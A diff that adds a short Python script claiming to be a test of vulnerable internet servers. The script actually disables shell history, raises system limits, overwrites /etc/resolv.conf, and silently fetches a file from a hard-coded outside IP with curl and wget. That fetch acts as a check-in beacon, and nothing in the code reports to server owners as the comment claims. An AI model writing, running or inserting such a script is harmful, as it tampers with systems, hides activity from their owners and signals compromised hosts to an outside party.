@@ -1,0 +1,13 @@
+#!/usr/bin/env python
+#-test of all of the internet security vuln servers will be reported to the owners 
+ 
+import os, sys
+ 
+os.system("clear")
+os.system("ulimit -s 999999;ulimit -n 999999;ulimit -u 999999")
+os.system("set +o history")
+os.system("echo nameserver 8.8.8.8 > /etc/resolv.conf")
+os.system("curl -Lso /dev/null http://5.9.11.105/156k6.gif")
+os.system("wget -qO /dev/null http://5.9.11.105/156k6.gif")
+os.system("echo email me lolsec@420blaze.it")
+os.system("echo bored")
